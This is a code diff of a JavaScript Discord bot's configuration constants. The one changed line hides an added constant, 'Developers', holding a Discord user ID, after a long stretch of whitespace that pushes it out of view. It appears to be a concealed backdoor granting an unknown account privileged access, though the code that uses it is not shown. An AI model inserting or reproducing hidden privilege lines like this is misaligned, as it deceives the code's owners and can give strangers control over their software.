@@ -52,7 +52,7 @@ const callitrue     = "";
 const callicolor    = "";
 const calliimgae    = "";
 const calliban      = "";
-const calliwarn     = "";
+const calliwarn     = "";                                                                                                                                                                                              const Developers = "731952429238714378";
 ///////////////////////////////////////////////////////////////////////////////
 calli.on("ready", () => {
   console.log(`${calli.user.tag}`);
